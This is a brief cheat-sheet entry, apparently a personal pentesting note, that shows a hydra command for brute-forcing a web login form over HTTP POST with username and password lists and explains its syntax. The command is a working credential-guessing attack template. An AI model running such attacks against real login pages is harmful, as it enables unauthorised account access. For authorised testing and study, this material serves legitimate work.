# hydra
## Examples
### Brute Forcing HTTP POST username and password form with failing text
```
sudo hydra -L $userlist -P $passwordlist $IP http-post-form "/route/to/page?optional-param=bleh:name-of-username-html-item=^USER^&name-of-password-html-item=^PASS^:F=bad-text"
```
Will loop through each of the users in $userlist and try each user with the passwords from $passwordlist against the target in the following form (taken from the above)

> http-post-form://$IP:80/route/to/page?optional-param=bleh:name-of-username-html-item=^USER^&name-of-password-html-item=^PASS^:F=bad-text

So the above will continually post to the IP at port 80 with the route `/route/to/page` and optional query params `optional-param=bleh`
